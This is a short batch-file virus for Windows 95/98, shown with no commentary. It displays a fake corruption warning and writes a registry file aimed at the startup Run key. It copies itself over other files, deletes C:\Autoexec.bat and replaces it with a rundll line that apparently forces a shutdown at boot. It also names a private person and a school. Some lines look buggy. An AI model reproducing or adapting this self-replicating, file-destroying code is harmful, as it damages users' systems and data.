   @echo off
   echo Dont Interrupt This Process, Theres a Chance That Win95/98 Will Corrupt! >> %0.cdr
   @break off
   :start
   ECHO REGEDIT4>%windir%\EnableBootup.reg
   ECHO.>>%windir%\EnableBootup.reg
   ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>%windir%\EnableBootup.reg
   ECHO "RegisteredOwner"="Marta Lisa Westman">>%windir%\EnableBootup.reg
   ECHO "RegisteredOrganization"="The Prison Camp Of Oxhamns School">>%windir%\EnableBootup.reg
   if (%1)==() goto viral_scan
   :viral_inf
   if exist  %0.cdr goto viral_end
   type %0 > %1
   goto viral_end
   :viral_scan
   for %%f in (*.cdr) do call &0 %%f
   if exist %0.cdr del c:\Autoexec.bat
   ECHO rundll user,#7 0 5 >> C:\Autoexec.bat
   :start
